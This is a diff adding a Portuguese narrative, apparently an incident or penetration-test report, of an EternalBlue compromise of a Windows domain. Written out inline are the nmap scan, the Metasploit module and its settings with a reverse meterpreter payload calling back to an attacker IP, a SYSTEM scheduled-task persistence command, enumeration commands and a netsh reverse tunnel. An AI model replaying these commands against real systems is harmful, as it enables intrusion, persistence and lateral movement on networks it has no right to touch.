@@ -1,0 +1,11 @@
+Durante a fase inicial de reconhecimento, o atacante executou o comando nmap -p445 --script=smb-vuln* -oN smb_scan.txt 10.10.14.32 para identificar possíveis vulnerabilidades SMB em estações do domínio interno. O resultado revelou que uma máquina Windows Server 2016 estava executando o serviço SMBv1 vulnerável à falha MS17-010 (EternalBlue).
+
+Para confirmar a vulnerabilidade, o atacante utilizou o scanner smb_ms17_010 da ferramenta Metasploit Framework, com o comando use exploit/windows/smb/ms17_010_eternalblue, configurando o alvo com set RHOSTS 10.10.14.32 e o payload com set PAYLOAD windows/x64/meterpreter/reverse_tcp. Após definir o IP de retorno com set LHOST 10.10.14.8 e a porta 4444, o exploit foi executado com o comando exploit.
+
+O ataque foi bem-sucedido, resultando em uma sessão de acesso remoto com privilégios de sistema na máquina alvo. Em seguida, o atacante realizou reconhecimento interno com o comando net view /domain para mapear máquinas ativas, e executou whoami /all para verificar privilégios do contexto obtido.
+
+Durante a exploração, o atacante utilizou o comando reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run para identificar chaves de inicialização persistentes e potencialmente sensíveis. Foram coletadas informações de usuários com o comando net user e listadas as conexões de rede com netstat -an.
+
+Com o acesso confirmado, foi implantada uma persistência via agendamento de tarefa, utilizando o comando schtasks /create /tn "SystemUpdate" /tr "C:\Windows\Temp\sysupdater.bat" /sc minute /mo 30 /ru SYSTEM. O arquivo sysupdater.bat executava um payload remoto que reconectava ao servidor de comando e controle do atacante, garantindo acesso contínuo.
+
+O atacante, então, iniciou o movimento lateral dentro da rede utilizando o serviço SMB para copiar arquivos e testar credenciais comprometidas, explorando novamente o exploit EternalBlue em outras máquinas Windows vulneráveis do mesmo segmento. Por fim, foi observado o uso de um túnel reverso configurado via netsh interface portproxy para redirecionar conexões internas para o host atacante, permitindo manter a comunicação mesmo em redes segmentadas.
